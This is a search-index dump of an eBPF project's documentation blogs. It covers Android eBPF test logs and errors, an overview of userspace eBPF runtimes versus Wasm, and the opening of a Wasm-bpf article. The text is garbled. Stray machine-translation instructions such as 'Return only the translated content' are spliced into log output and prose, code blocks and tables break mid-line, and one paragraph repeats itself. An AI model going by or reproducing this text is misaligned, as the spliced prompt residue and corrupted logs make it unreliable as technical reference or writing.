</p>"},{"location":"blogs/test-for-Android/#test-results","title":"Test Results","text":""},{"location":"blogs/test-for-Android/#successful-cases","title":"Successful Cases","text":""},{"location":"blogs/test-for-Android/#bootstrap","title":"bootstrap","text":"<p>The running output is as follows:</p> <pre><code>TIME     PID     PPID    EXIT_CODE  DURATION_NS  COMM    FILENAME  EXIT_EVENT\n09:09:19  10217  479     0          0            sh      /system/bin/sh 0\n09:09:19  10217  479     0          0            ps      /system/bin/ps 0\n09:09:19  10217  479     0          54352100     ps                1\n09:09:21  10219  479     0          0            sh      /system/bin/sh 0\n09:09:21  10219  479     0          0            ps      /system/bin/ps 0\n09:09:21  10219  479     0          44260900     ps                1\n</code></pre>"},{"location":"blogs/test-for-Android/#tcpstates","title":"tcpstates","text":"<p>After monitoring starts, download the web page using <code>wget</code> in the Linux environment:</p> <pre><code>TIME     SADDR   DADDR   SKADDR  TS_US   DELTA_US  PID     OLDSTATE  NEWSTATE  FAMILY  SPORT   DPORT   TASK\n09:07:46  0x4007000200005000000000000f02000a 0x5000000000000f02000a8bc53f77 18446635827774444352 3315344998 0 10115 7 2 2 0 80 wget\n09:07:46  0x40020002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315465870 120872 0 2 1 2 55694 80 swapper/0\n09:07:46  0x40010002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315668799 202929 10115 1 4 2 55694 80 wget\".\n</code></pre> <p>format: Return only the translated content, not including the original text.09:07:46  0x40040002d98e50003d99f8090f02000a 0xd98e50003d99f8090f02000a8bc53f77 18446635827774444352 3315670037 1237 0 4 5 2 55694 80 swapper/0 09:07:46  0x40050002000050003d99f8090f02000a 0x50003d99f8090f02000a8bc53f77 18446635827774444352 3315670225 188 0 5 7 2 55694 80 swapper/0 09:07:47  0x400200020000bb01565811650f02000a 0xbb01565811650f02000a6aa0d9ac 18446635828348806592 3316433261 0 2546 2 7 2 49970 443 ChromiumNet 09:07:47  0x400200020000bb01db794a690f02000a 0xbb01db794a690f02000aea2afb8e 18446635827774427776 3316535591 0 1469 2 7 2 37386 443 ChromiumNet</p> <p>Begin testing by opening the Chrome browser on the Android Studio simulation  and visiting the Baidu webpage:</p> <pre><code>TIME     SADDR   DADDR   SKADDR  TS_US   DELTA_US  PID     OLDSTATE  NEWSTATE  FAMILY  SPORT   DPORT   TASK\n07:46:58  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aeb6f2270 18446631020066638144 192874641 0 3305 7 2 2 0 443 NetworkService\n07:46:58  0x40020002d28abb01494b6ebe0f02000a 0xd28abb01494b6ebe0f02000aeb6f2270 18446631020066638144 192921938 47297 3305 2 1 2 53898 443 NetworkService\n07:46:58  0x400700020000bb01000000000f02000a 0xbb01000000000f02000ae7e7e8b7 18446631020132433920 193111426 0 3305 7 2 2 0 443 NetworkService\n07:46:58  0x40020002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193124670 13244 3305 2 1 2 46240 443 NetworkService\n07:46:58  0x40010002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193185397 60727 3305 1 4 2 46240 443 NetworkService\n07:46:58  0x40040002b4a0bb0179ff85e80f02000a 0xb4a0bb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193186122 724 3305 4 5 2 46240 443 NetworkService\n07:46:58  0x400500020000bb0179ff85e80f02000a 0xbb0179ff85e80f02000ae7e7e8b7 18446631020132433920 193186244 122 3305 5 7 2 46240 443 NetworkService\n07:46:59  0x40010002d01ebb01d0c52f5c0f02000a 0xd01ebb01d0c52f5c0f02000a51449c27 18446631020103553856 194110884 0 5130 1 8 2 53278 443 ThreadPoolForeg\".07:46:59  0x400800020000bb01d0c52f5c0f02000a 0xbb01d0c52f5c0f02000a51449c27 18446631020103553856 194121000 10116 3305 8 7 2 53278 443 NetworkService\n07:46:59  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aeb6f2270 18446631020099513920 194603677 0 3305 7 2 2 0 443 NetworkService\n07:46:59  0x40020002d28ebb0182dd92990f02000a 0xd28ebb0182dd92990f02000aeb6f2270 18446631020099513920 194649313 45635 12 2 1 2 53902 443 ksoftirqd/0\n07:47:00  0x400700020000bb01000000000f02000a 0xbb01000000000f02000a26f6e878 18446631020132433920 195193350 0 3305 7 2 2 0 443 NetworkService\n07:47:00  0x40020002ba32bb01e0e09e3a0f02000a 0xba32bb01e0e09e3a0f02000a26f6e878 18446631020132433920 195206992 13642 0 2 1 2 47666 443 swapper/0\n07:47:00  0x400700020000bb01000000000f02000a 0xbb01000000000f02000ae7e7e8b7 18446631020132448128 195233125 0 3305 7 2 2 0 443 NetworkService\n07:47:00  0x40020002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195246569 13444 3305 2 1 2 46248 443 NetworkService\n07:47:00  0xf02000affff00000000000000000000 0x1aca06cffff00000000000000000000 18446631019225912320 195383897 0 947 7 2 10 0 80 Thread-11\n07:47:00  0x40010002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195421584 175014 3305 1 4 2 46248 443 NetworkService\n07:47:00  0x40040002b4a8bb0136cac8dd0f02000a 0xb4a8bb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195422361 777 3305 4 5 2 46248 443 NetworkService\n07:47:00  0x400500020000bb0136cac8dd0f02000a 0xbb0136cac8dd0f02000ae7e7e8b7 18446631020132448128 195422450 88 3305 5 7 2 46248 443 NetworkService\n07:47:01  0x400700020000bb01000000000f02000a 0xbb01000000000f02000aea2afb8e 18446631020099528128 196321556 0 1315 7 2 2 0 443 ChromiumNet\n\n## Failed Cases\n\n### [fentry-link](https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/fentry-link)\n\nBuilds successfully, but encounters an error when running:\n\n```sh\nlibbpf: prog 'do_unlinkat': failed to attach: Device or resource busy\nlibbpf: prog 'do_unlinkat': failed to auto-attach: -16\nfailed to attach skeleton\".\n</code></pre> <p>Please note that this is a translation of the Markdown text provided.Error: BpfError(\"load and attach ebpf program failed\") <pre><code>### [opensnoop](https://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools/opensnoop)\n\nSuccessfully built, but encountered an error when running:\n\n```sh\nlibbpf: failed to determine tracepoint 'syscalls/sys_enter_open' perf event ID: No such file or directory\nlibbpf: prog 'tracepoint__syscalls__sys_enter_open': failed to create tracepoint 'syscalls/sys_enter_open' perf event: No such file or directory\nlibbpf: prog 'tracepoint__syscalls__sys_enter_open': failed to auto-attach: -2\nfailed to attach skeleton\nError: BpfError(\"load and attach ebpf program failed\")\n</code></pre></p> <p>After investigation, it was found that the <code>CONFIG_FTRACE_SYSCALLS</code> option was not enabled in the kernel, which caused the tracepoint for syscalls to be unavailable.</p>"},{"location":"blogs/test-for-Android/#runqlat","title":"runqlat","text":"<p>Encountered an error during the build process:</p> <pre><code>Compiling bpf object...\n$ clang -g -O2 -target bpf -Wno-unknown-attributes -D__TARGET_ARCH_x86 -idirafter /usr/local/include -idirafter /usr/lib/llvm-11/lib/clang/11.0.1/include -idirafter /usr/include/x86_64-linux-gnu -idirafter /usr/include  -I/tmp/eunomia.9fwyJN/include -I/tmp/eunomia.9fwyJN/include/vmlinux/x86  -I/root/eunomia-bpf/examples/bpftools/runqlat -c examples/bpftools/runqlat/runqlat.bpf.temp.c -o examples/bpftools/runqlat/runqlat.bpf.o\n In file included from examples/bpftools/runqlat/runqlat.bpf.temp.c:10:\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: error: use of unknown builtin '__builtin_preserve_type_info' [-Wimplicit-function-declaration]\n    if (bpf_core_type_exists(struct trace_event_raw_block_rq_completion___x))\n        ^\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:2: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\n        ^\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: note: did you mean '__builtin_preserve_field_info'?\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:2: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\".\n```^\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:27:9: note: '__builtin_preserve_field_info' declared here\n    if (bpf_core_field_exists(t-&gt;__state))\n        ^\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:132:2: note: expanded from macro 'bpf_core_field_exists'\n        __builtin_preserve_field_info(___bpf_field_ref(field), BPF_FIELD_EXISTS)\n        ^\nIn file included from examples/bpftools/runqlat/runqlat.bpf.temp.c:10:\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: warning: indirection of non-volatile null pointer will be deleted, not trap [-Wnull-dereference]\n    if (bpf_core_type_exists(struct trace_event_raw_block_rq_completion___x))\n        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:31: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\n                                     ^~~~~~~~~~~~~~~~~~\n/root/eunomia-bpf/examples/bpftools/runqlat/core_fixes.bpf.h:76:9: note: consider using __builtin_trap() or qualifying pointer with 'volatile'\n/tmp/eunomia.9fwyJN/include/bpf/bpf_core_read.h:185:31: note: expanded from macro 'bpf_core_type_exists'\n        __builtin_preserve_type_info(*(typeof(type) *)0, BPF_TYPE_EXISTS)\n                                     ^\n1 warning and 1 error generated.\n\nthread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: No such file or directory (os error 2)', src/compile_bpf.rs:171:37\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\n</code></pre> <p>The specific cause of the error currently needs further investigation.</p>"},{"location":"blogs/test-for-Android/#summary","title":"Summary","text":"<p>In the Android shell, it can be observed that the <code>CONFIG_DEBUG_INFO_BTF</code> kernel compilation option is enabled by default. On this basis, the examples provided by the eunomia-bpf project already have some successful cases, such as monitoring the execution of the <code>exec</code> function family and the tcp connection state.</p> <p>For projects that cannot run, the reasons are mainly as follows:</p> <ol> <li>The kernel compilation options do not support the relevant eBPF features;</li> <li>The Linux environment packaged by eadb is relatively weak and lacks necessary dependencies;</li> </ol> <p>Currently, using eBPF tools in the Android system still requires building a complete Linux runtime environment. However, the Android kernel itself has comprehensive support for eBPF. The test this time proves that higher versions of the Android kernel support BTF debugging information and the execution of eBPF programs dependent on CO-RE.Instructions: Translate the following Chinese text to English  while maintaining the original formatting: \"Android system eBPF tool development requires the addition of official new features. At present, it seems that using eBPF tools directly through Android apps requires a lot of work. Additionally, since eBPF tools require root permissions, ordinary Android users will face many difficulties.</p>"},{"location":"blogs/test-for-Android/#references","title":"References","text":"<p>Share on  Share on </p> <ol> <li> <p>https://source.android.google.cn/docs/core/architecture/kernel/bpf \u21a9</p> </li> <li> <p>https://mp.weixin.qq.com/s/mul4n5D3nXThjxuHV7GpMA \u21a9</p> </li> <li> <p>https://blog.seeflower.dev/archives/138/\". format: Return only the translated content, not including the original text.\u00a0\u21a9</p> </li> </ol>"},{"location":"blogs/userspace-ebpf/","title":"Userspace eBPF Runtimes: Overview and Applications","text":"<p>Yusheng Zheng</p> <p>In this blog post, we'll dive into the world of eBPF in userspace. While many are familiar with kernel-based eBPF, userspace eBPF runtimes have been making significant strides and offer compelling use cases. We will also compare userspace eBPF runtimes with Wasm runtimes, another popular technology in the cloud-native and edge computing landscape. Among these, we're excited to introduce bpftime. Powered by an LLVM <code>JIT/AOT</code> backend, our benchmarks suggest that bpftime stands out as one of the fastest userspace eBPF runtimes available.</p>"},{"location":"blogs/userspace-ebpf/#introduction-to-ebpf","title":"Introduction to eBPF","text":""},{"location":"blogs/userspace-ebpf/#what-is-ebpf","title":"What is eBPF?","text":"<p>eBPF, which stands for \"extended Berkeley Packet Filter,\" is a revolutionary technology that facilitates the dynamic tracing and monitoring of kernel operations without modifying kernel source code or rebooting the system. Originally designed for network packet filtering, eBPF has evolved to support a wide range of applications, from performance analysis to security, making it a versatile tool in a system administrator's arsenal.</p> <p>The story of eBPF begins with the Berkeley Packet Filter (BPF), introduced in the early 1990s as a way to filter and capture network packets efficiently. Over the years, BPF proved to be an invaluable asset, but there was room for improvement. eBPF emerged as an advanced iteration of BPF, equipped with a richer instruction set and the capability to interact with kernel data structures directly.</p> <p>The Linux kernel adopted eBPF around 2014, and since then, its popularity and adoption have skyrocketed. Key contributors to the Linux kernel worked diligently to evolve eBPF from a simple packet filter to a generic and powerful bytecode engine.</p>"},{"location":"blogs/userspace-ebpf/#its-significance-in-modern-computing-and-network-solutions","title":"Its significance in modern computing and network solutions","text":"<p>In today's complex computing environments, the need for real-time data and insights is paramount. eBPF shines in this regard, allowing developers and administrators to introspect and modify system behaviors on the fly.</p> <p>Given its dynamic nature, eBPF has become a cornerstone of modern networking solutions. It enables fine-grained traffic control, load balancing, and security enforcement at the kernel level, ensuring optimal performance and security. Furthermore, in the realm of observability, eBPF provides granular insights into system calls, hardware events, and more, facilitating proactive problem detection and resolution.</p>"},{"location":"blogs/userspace-ebpf/#ebpf-from-kernel-runtime-to-userspace-runtime","title":"eBPF: from kernel runtime to userspace runtime","text":"<p>While the initial design of eBPF was deeply embedded within the kernel, the demand for similar functionality in userspace applications led to the evolution of userspace eBPF runtimes. These runtimes allow developers to leverage eBPF's capabilities outside the kernel, expanding its utility and applicability. Userspace eBPF runtimes make it feasible to apply eBPF's prowess to a broader set of applications, from custom network protocols to novel security solutions, further cementing eBPF's role as a transformative technology in the computing landscape.</p>"},{"location":"blogs/userspace-ebpf/#userspace-ebpf-runtimes-and-their-role","title":"Userspace eBPF Runtimes and Their Role","text":""},{"location":"blogs/userspace-ebpf/#what-is-a-userspace-ebpf-runtime","title":"What is a userspace eBPF runtime?","text":"<p>A userspace eBPF runtime provides a platform outside of the kernel to run eBPF programs. While one of eBPF's standout attributes is its capability to execute code within the kernel space, offering rapid observability and data aggregation, there are scenarios where having a userspace alternative becomes valuable. These userspace runtimes extend the reach of eBPF's versatility to areas beyond kernel integrations and often serve as experimental grounds, debugging tools, or frameworks for specific use cases.</p>"},{"location":"blogs/userspace-ebpf/#introduction-to-specific-runtimes","title":"Introduction to specific runtimes","text":""},{"location":"blogs/userspace-ebpf/#ubpf","title":"ubpf","text":"<p>uBPF was among the early attempts to bring eBPF to the userspace. Conceived primarily as a proof-of-concept, it served as a user-space interpretation of an eBPF interpreter combined with an x86_64 and arm64 JIT. Despite its origins as an early prototype, uBPF garnered attention and was utilized as a foundation for high-performance networking projects such as DPDK and Oko. Its non-GPL licensing (Apache) makes it favorable for a wide range of projects, inclusive of proprietary ones. However, as of recent, uBPF is catching up with kernel developments, particularly with contributions from Microsoft for its eBPF Windows implementation. However, develop ubpf and rbpf programs may require a specific toolchain, which may be a barrier for some users. ubpf only have a limited hashmap implementation, which may not be enough for some users.</p>"},{"location":"blogs/userspace-ebpf/#rbpf","title":"rbpf","text":"<p>rbpf is heavily influenced by uBPF but with an emphasis on Rust, a language renowned for its memory safety guarantees. The creation of rbpf was driven by a desire to explore the intersections of eBPF and Rust. While not as widespread in adoption, notable users of rbpf include the Solana team, employing it for blockchain tools with eBPF-driven smart contracts. One of rbpf's advantages lies in its licensing (MIT), allowing for broad reuse across various projects. rbpf also lacks eBPF map support, and only has JIT support for x86_64.</p>"},{"location":"blogs/userspace-ebpf/#bpftime","title":"bpftime","text":"<p>Built atop LLVM JIT/AOT, bpftime is a cutting-edge, high-performance eBPF runtime designed exclusively for userspace operations. It stands out with its rapid Uprobe capabilities and Syscall hooks, notably outperforming the kernel Uprobe by a tenfold margin. Additionally, bpftime offers programmatic syscall hooking, shared memory maps, and compatibility with familiar toolchains like libbpf and clang. Its design addresses some kernel eBPF limitations and outpaces plugin systems like the Wasm runtime in certain aspects.</p>"},{"location":"blogs/userspace-ebpf/#why-is-having-a-userspace-version-of-ebpf-interesting","title":"Why is Having a Userspace Version of eBPF Interesting?","text":"<p>eBPF, while renowned for its kernel-space operations, has observed a growing interest in its userspace adaptations. Here's why migrating eBPF to userspace is capturing the attention of technologists:</p>"},{"location":"blogs/userspace-ebpf/#enhanced-performance","title":"Enhanced Performance","text":"<p>In kernel operations, the Uprobe component of eBPF is often beleaguered by performance inefficiencies, primarily due to the overheads introduced by context switches. In latency-sensitive applications, these inefficiencies can be detrimental, affecting real-time monitoring and data processing. By transitioning to userspace, eBPF can bypass these context switch related delays, leading to a more optimized performance. Runtimes like <code>bpftime</code> exemplify this, offering substantial performance improvements compared to their kernel counterparts.</p>"},{"location":"blogs/userspace-ebpf/#flexibility-and-integration","title":"Flexibility and Integration","text":"<p>Userspace eBPF runtimes champion flexibility. Unlike some alternatives, such as the Wasm runtime, which might necessitate manual integrations, userspace eBPF provides the boon of automatic instrumentation. This means they can be seamlessly introduced into running processes without the need for cumbersome restarts or recompilations, ensuring smoother operational flows.</p>"},{"location":"blogs/userspace-ebpf/#augmented-security","title":"Augmented Security","text":"<p>Operating in kernel mode, eBPF programs require root access, which can inadvertently expand the attack surface, making systems susceptible to vulnerabilities like container escapes or even potential kernel exploits. Userspace runtimes, however, operate outside this high-risk zone. By functioning in userspace, they demand fewer privileges, inherently reducing the potential avenues for security breaches.</p>"},{"location":"blogs/userspace-ebpf/#debugging-and-licensing-flexibility","title":"Debugging and Licensing Flexibility","text":"<p>One of the innate advantages of userspace eBPF runtimes is the ease with which developers can debug their code. The accessibility to integrate breakpoints in a userspace interpreter is a marked advantage over the relatively constrained debugging capabilities in kernel eBPF. Additionally, the licensing flexibility of userspace eBPF runtimes, typically offered under licenses like Apache or MIT, ensures they can be paired with a diverse range of projects, including proprietary ones, sidestepping the GPL constraints associated with kernel code.</p>"},{"location":"blogs/userspace-ebpf/#use-cases-existing-ebpf-userspace-applications","title":"Use Cases: Existing eBPF Userspace Applications","text":"<p>Userspace eBPF is being utilized in a number of notable projects, each harnessing the unique capabilities of eBPF to enhance their functionalities. Here's how Userspace eBPF is currently utilized in various applications:</p> <ol> <li>Oko:</li> </ol> <p>Oko is an extension of Open vSwitch-DPDK that provides runtime extension with BPF programs. It enables the use of BPF programs to process packets in userspace, providing flexible packet processing and facilitating the integration of Open vSwitch with other systems.</p> <ol> <li>DPDK eBPF Support:</li> </ol> <p>The DPDK (Data Plane Development Kit) eBPF support facilitates fast packet processing by enabling the use of eBPF programs in userspace, which can be loaded and run to analyze network packets. This enhances the flexibility and programmability of network applications without requiring kernel modifications.</p> <ol> <li>Solana:</li> </ol> <p>Solana utilizes eBPF to implement a JIT (Just-In-Time) compiler, which is essential for executing smart contracts on its blockchain network. The use of eBPF ensures safety, performance, and architecture agnosticism, thus allowing efficient execution of smart contracts across validator nodes on the Solana blockchain.</p> <ol> <li>eBPF for Windows (Work-In-Progress):</li> </ol> <p>This project is aimed at bringing the eBPF toolchains and APIs familiar in the Linux ecosystem to Windows, allowing existing eBPF toolchains to be utilized on top of Windows. This demonstrates a promising endeavor to extend the capabilities of eBPF beyond Linux, although it's still a work in progress.</p> <p>The benefits of using eBPF in these applications include:</p> <ul> <li>Flexibility: eBPF provides a flexible framework for running programs in the kernel or userspace, enabling developers to extend the functionality of existing systems without modifying their core code.</li> <li>Performance: By allowing JIT compilation and efficient packet processing, eBPF can significantly enhance the performance of network applications and blockchain smart contract execution.</li> <li>Safety and Security: The eBPF framework provides mechanisms for verifying the safety properties of programs before execution, thus ensuring the integrity and security of the systems it is integrated with.</li> <li>Cross-platform Capability: The architecture-agnostic nature of eBPF instruction set enables cross-platform compatibility, as seen in projects like Solana and the work-in-progress eBPF for Windows.</li> </ul> <p>These attributes make eBPF a powerful tool for augmenting a variety of applications, ranging from network processing to blockchain smart contract execution, and beyond. There are also some papers that discuss the use of eBPF in userspace:</p> <ol> <li>RapidPatch: Firmware Hotpatching for Real-Time Embedded Devices:</li> </ol> <p>This paper introduces a new hotpatching framework named RapidPatch, which is designed to facilitate the propagation of patches by installing generic patches on heterogeneous embedded devices without disrupting other tasks running on them.</p> <p>Furthermore, RapidPatch proposes two types of eBPF patches for different types of vulnerabilities and develops an eBPF patch verifier to ensure patch safety.</p> <ol> <li>Femto-Containers: Lightweight Virtualization and Fault Isolation For Small Software Functions on Low-Power IoT Microcontrollers:</li> </ol> <p>This paper presents Femto-Containers, a novel framework that enables the secure deployment, execution, and isolation of small virtual software functions on low-power IoT devices over a network.</p> <p>The framework is implemented and provided in RIOT, a popular open source IoT operating system, with an emphasis on secure deployment, execution, and isolation of small virtual software functions on low-power IoT devices, over the network.</p> <p>The paper discusses the implementation of a Femto-Container hosting engine integrated within a common low-power IoT operating system (RIOT), enhancing it with the ability to start, update, or terminate Femto-Containers on demand, securely over a standard IPv6/6LoWPAN network.</p> <p>These papers delve into pertinent advancements concerning firmware patching and lightweight virtualization, demonstrating innovations that address critical challenges in the domains of real-time embedded systems and low-power IoT microcontrollers respectively.</p>"},{"location":"blogs/userspace-ebpf/#userspace-ebpf-runtime-vs-wasm-runtime","title":"Userspace eBPF Runtime vs Wasm Runtime","text":"<p>In the evolving landscape of cloud-native and edge computing, both eBPF (extended Berkeley Packet Filter) and Wasm (WebAssembly) have emerged as powerful tools. However, they come with their own set of design principles and trade-offs.</p>"},{"location":"blogs/userspace-ebpf/#a-comparison-of-ebpf-and-wasm","title":"A Comparison of eBPF and Wasm","text":"<p>eBPF:</p> <ul> <li>Philosophy: eBPF prioritizes performance, often making it the choice for real-time kernel operations and high-throughput networking tasks.</li> <li>Security: While performance takes the forefront, security in eBPF is ensured through the use of a verifier, ensuring that all programs are safe to run without causing kernel panics or infinite loops.</li> </ul> <p>Wasm:</p> <ul> <li>Philosophy: Originally designed for the web, Wasm places a higher emphasis on portability and security. It was conceived to execute code nearly as fast as running native machine code and ensures safety in hostile environments like web browsers.</li> <li>Security: The primary security model for Wasm revolves around Software Fault Isolation (SFI). This model guarantees safe execution by enforcing sandboxing, even though this can introduce some runtime overheads.</li> </ul> <p>For both technologies, reliance on underlying libraries for complex operations is paramount. For instance, Wasm leans on libraries like <code>Wasi-nn</code> for neural network operations. However, when interfacing with such external APIs, especially in Wasm's context, there's a need for additional validation and runtime checks, sometimes leading to substantial performance costs. eBPF, when embedded within the host, capitalizes on its verifier to ensure code safety, offering a more performance-centric approach.</p> <p>On the language support front, while eBPF's niche and specialized nature mean limited language support, Wasm boasts a broader language portfolio due to its origin and design for the web.</p>"},{"location":"blogs/userspace-ebpf/#conclusion","title":"Conclusion","text":"<p>Userspace eBPF runtimes are an exciting development that expands the capabilities of eBPF beyond the kernel. As highlighted in this post, they offer compelling benefits like enhanced performance, flexibility, and security compared to kernel-based eBPF. Runtimes like bpftime demonstrate the potential for substantial speedups, even outperforming alternatives like Wasm runtimes in certain dimensions like low-level performance.</p> <p>With innovative frameworks like RapidPatch and Femto-Containers utilizing userspace eBPF for patching and lightweight virtualization respectively, we are witnessing pioneering use cases that address critical challenges in embedded systems and IoT domains. As eBPF continues its evolution in userspace, we can expect even more creative applications that augment everything from smart contracts to network protocols.</p> <p>While alternatives like Wasm certainly have their place with a strong emphasis on web portability and security, eBPF's specialized nature gives it an edge for performance-critical tasks. Ultimately, the choice between the two depends on the specific use case and priorities. As they continue to evolve, userspace eBPF runtimes are cementing their position as an indispensable part of the cloud-native technology stack, offering an unparalleled combination of safety, efficiency and innovation.</p> <p>We encourage our readers to dive deep into the world of userspace eBPF, starting with our bpftime GitHub repository: https://github.com/eunomia-bpf/bpftime Contributions, feedback, or simply using the tool can further the cause and provide invaluable insights to the community.</p> <p>If you use our project in research, please cite our repo.</p>"},{"location":"blogs/userspace-ebpf/#reference","title":"reference","text":"<ol> <li>bpftime: https://github.com/eunomia-bpf/bpftime</li> <li>ubpf: https://github.com/iovisor/ubpf</li> <li>rbpf: https://github.com/qmonnet/rbpf</li> <li>Oko: https://github.com/Orange-OpenSource/Oko</li> <li>RapidPatch: Firmware Hotpatching for Real-Time Embedded Devices: https://www.usenix.org/conference/usenixsecurity22/presentation/he-yi</li> <li>DPDK eBPF Support: https://www.dpdk.org/wp-content/uploads/sites/35/2018/10/pm-07-DPDK-BPFu6.pdf</li> <li>Solana: https://solana.com/</li> <li>eBPF for Windows (Work-In-Progress): https://github.com/microsoft/ebpf-for-windows</li> <li>Femto-Containers: Lightweight Virtualization and Fault Isolation For Small Software Functions on Low-Power IoT Microcontrollers: https://arxiv.org/abs/2210.03432</li> </ol> <p>Share on  Share on </p>"},{"location":"blogs/wasm-bpf/","title":"Wasm-bpf: A Common eBPF Kernel Programmability for Cloud-Native Webassembly","text":"<p>Author: Yusheng Zheng, Mao-Lin Chen</p> <p>Originally developed with a browser-safe sandbox in mind, Wasm has evolved to make WebAssembly a high-performance, cross-platform and multilingual software sandbox environment for cloud-native software components, and Wasm lightweight containers are well suited as the next-generation serverless platform runtime. Another exciting trend is the rise of eBPF, which enables cloud-native developers to build secure networks, service grids, and multiple observable components, and which is also gradually penetrating and penetrating deeper into kernel components, providing more powerful kernel-state programmable interactions.</p> <p>Wasm-bpf is a new open source project [1] that defines a set of abstractions for eBPF-related system interfaces and provides a corresponding set of development toolchains, libraries, and generic Wasm + eBPF runtime platform instances, giving applications in any Wasm virtual machine or Wasm lightweight container the ability to sink and extend usage scenarios to the kernel state, accessing almost all data in the kernel state and The eBPF runtime platform instance allows applications in any Wasm virtual machine or Wasm lightweight container to sink and expand their usage scenarios to the kernel state, access almost all data in the kernel state and user state, and achieve programmable control over the entire operating system in many aspects such as networking and security, thus greatly expanding the WebAssembly ecosystem in non-browser application scenarios.</p>"},{"location":"blogs/wasm-bpf/#ebpf-based-system-interface-for-wasm","title":"eBPF-based System Interface for Wasm","text":"<p>Perhaps you have also read this quote from Solomon Hykes (one of the founders of Docker).</p> <ul> <li>Wasm-bpf: A Common eBPF Kernel Programmability for Cloud-Native Webassembly</li> <li>eBPF-based System Interface for Wasm</li> <li>eBPF: Extending the Kernel Securely and Efficiently<ul> <li>The Future of eBPF: A JavaScript-Like Programmable Interface for the Kernel</li> </ul> </li> <li>Interaction flow between user space and eBPF programs<ul> <li>Common user-state eBPF development framework</li> <li>A new eBPF development framework defined on top of the user-state Wasm-eBPF system interface</li> </ul> </li> <li>References</li> </ul>"},{"location":"blogs/wasm-bpf/#ebpf-extending-the-kernel-securely-and-efficiently","title":"eBPF: Extending the Kernel Securely and Efficiently","text":"<p>eBPF is a revolutionary technology, originating from the Linux kernel, that allows sandboxed programs to be run in the kernel of the operating system. It is used to safely and efficiently extend the functionality of the kernel without changing the kernel's source code or loading kernel modules.</p> <p>Looking historically, the operating system kernel has been an ideal place to implement various capabilities like observability, security, and networking due to its privileged ability to supervise and control the entire system. However, due to the high demands on stability and security, kernel feature iterations are typically very cautious, and it is difficult to accept customized, less common functionality improvements. Therefore, compared to the functionalities in user space, the rate of innovation at the kernel-level operating system layer has always been relatively low.[2]</p> <p>eBPF fundamentally changes this paradigm. By allowing sandboxed programs to run within the operating system, application developers can programmatically add additional functionalities to the operating system at runtime. The operating system then ensures safety and execution efficiency, as if it were compiled locally with the help of a Just-In-Time (JIT) compiler and a verification engine. eBPF programs are portable across kernel versions and can be automatically updated, thus avoiding workload interruptions and node restarts.</p> <p>Today, eBPF is widely used in various scenarios: in modern data centers and cloud-native environments, it provides high-performance network packet processing and load balancing; with very low resource overhead, it achieves observability of a variety of fine-grained metrics, helping application developers track applications and provide insights for troubleshooting performance issues; it ensures the secure execution of applications and containers, and more. The possibilities are endless, and the innovation unleashed by eBPF in the operating system kernel is just beginning.[3]</p>"},{"location":"blogs/wasm-bpf/#the-future-of-ebpf-a-javascript-like-programmable-interface-for-the-kernel","title":"The Future of eBPF: A JavaScript-Like Programmable Interface for the Kernel","text":"<p>For browsers, the introduction of JavaScript's programmability sparked a significant revolution, turning browsers into almost independent operating systems. Now, looking at eBPF: to understand the impact of eBPF on the programmability of the Linux kernel, it is helpful to have a high-level understanding of the structure of the Linux kernel and how it interacts with applications and hardware.[4]</p> <p>The main purpose of the Linux kernel is to abstract the hardware or virtual hardware and provide a consistent API (system calls) to allow applications to run and share resources. To achieve this, a series of subsystems and layers are maintained to distribute these responsibilities. Each subsystem typically allows some degree of configuration to take into account the different needs of the user. If the desired behavior cannot be configured, changing the kernel is necessary. Historically, changing the kernel's behavior or enabling user-written programs to run in the kernel has presented two options.</p> Support a kernel module locally Write a kernel module Change the kernel source code and convince the Linux kernel community that such a change is necessary. Wait a few years for a new kernel version to become a commodity. Fix it regularly, as every kernel version can break it. Risk breaking your Linux kernel due to the lack of security boundaries <p>In practice, neither option is commonly used; the former is too costly, and the latter has almost no portability.</p> <p>With eBPF, there is a new option to reprogram the behavior of the Linux kernel without changing the kernel's source code or loading kernel modules, while guaranteeing a certain degree of consistency and compatibility of behavior, as well as security, between different kernel versions. To achieve this, eBPF programs also need to have a corresponding set of APIs that allow user-defined applications to run and share resources -- in other words, in a sense, the eBPF virtual machine also provides a set of system call-like mechanisms that are available to Wasm virtual machines and user-state applications through the eBPF and user-state communication mechanisms. With the eBPF and user state communication mechanisms, Wasm VMs and user state applications can also gain full access to this set of \"system calls\", which can programmatically extend the capabilities of traditional system calls on the one hand, and achieve more efficient programmable IO processing on the other.</p> <p></p> <p>As the diagram above shows, today's Linux kernel is evolving into a new kernel model: user-defined applications can execute in both the kernel 